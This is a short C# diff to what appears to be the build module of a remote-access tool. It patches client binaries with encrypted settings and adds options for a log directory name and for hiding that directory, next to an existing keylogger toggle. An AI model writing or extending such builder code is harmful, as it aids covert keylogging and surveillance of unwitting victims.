@@ -68,6 +68,9 @@ namespace xServer.Core.Build
                                         case 9: //tag
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Tag, encKey);
                                             break;
+                                        case 10: //LogDirectoryName
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.LogDirectoryName, encKey);
+                                            break;
                                     }
                                     strings++;
                                 }
@@ -87,6 +90,9 @@ namespace xServer.Core.Build
                                             break;
                                         case 4: //Keylogger
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Keylogger));
+                                            break;
+                                        case 5: //HideLogDirectory
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideLogDirectory));
                                             break;
                                     }
                                     bools++;
